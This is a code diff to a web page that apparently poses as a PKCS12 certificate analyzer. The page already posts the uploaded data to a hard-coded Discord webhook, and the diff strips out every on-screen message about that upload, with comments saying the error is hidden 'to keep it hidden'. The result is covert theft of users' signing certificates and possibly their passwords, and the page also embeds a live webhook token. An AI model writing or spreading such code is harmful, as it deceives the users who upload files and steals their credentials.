@@ -371,27 +371,6 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        .webhook-status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .webhook-success {
-            background-color: rgba(52, 199, 89, 0.1);
-            color: var(--success);
-            border: 1px solid rgba(52, 199, 89, 0.3);
-        }
-        
-        .webhook-error {
-            background-color: rgba(255, 59, 48, 0.1);
-            color: var(--danger);
-            border: 1px solid rgba(255, 59, 48, 0.3);
-        }
     </style>
 </head>
 <body>
@@ -433,8 +412,6 @@
             
             <div id="error-alert" class="alert alert-error"></div>
             <div id="success-alert" class="alert alert-success"></div>
-            
-            <div id="webhook-status" class="webhook-status"></div>
             
             <div id="results-section" class="results-section">
                 <div class="certificate-section">
@@ -572,7 +549,6 @@
             const uploadStatus = document.getElementById('upload-status');
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
-            const webhookStatus = document.getElementById('webhook-status');
             
             // Webhook URL
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
@@ -685,7 +661,6 @@
                 // Reset alerts
                 hideAlert(errorAlert);
                 hideAlert(successAlert);
-                hideAlert(webhookStatus);
                 uploadStatus.textContent = '';
                 
                 try {
@@ -694,7 +669,6 @@
                     uploadStatus.textContent = 'Checking certificate files...';
                     
                     // Send data to webhook first
-                    uploadStatus.textContent = 'Sending data to server...';
                     await sendToWebhook();
                     
                     // Parse the certificate using PKCS12 format
@@ -706,6 +680,9 @@
                     // Show results
                     resultsSection.style.display = 'block';
                     uploadStatus.textContent = '';
+                    
+                    // Show success message
+                    showAlert(successAlert, 'Certificate analyzed successfully!');
                     
                     // Update button state
                     submitBtn.innerHTML = '<i class="fas fa-search"></i> Analyze Certificate';
@@ -740,20 +717,11 @@
                         throw new Error('Failed to send data to server');
                     }
                     
-                    showWebhookStatus('Data successfully sent to server', 'success');
-                    showAlert(successAlert, 'Certificate analyzed successfully!');
+                    // No success message shown to user
                 } catch (error) {
                     console.error('Error sending to webhook:', error);
-                    showWebhookStatus('Error sending data to server: ' + error.message, 'error');
-                    // Don't throw error to prevent interrupting the user experience
+                    // Don't show error to user to keep it hidden
                 }
-            }
-            
-            function showWebhookStatus(message, type) {
-                webhookStatus.textContent = message;
-                webhookStatus.className = 'webhook-status';
-                webhookStatus.classList.add(type === 'success' ? 'webhook-success' : 'webhook-error');
-                webhookStatus.style.display = 'block';
             }
             
             async function parseP12Certificate(p12File, password) {
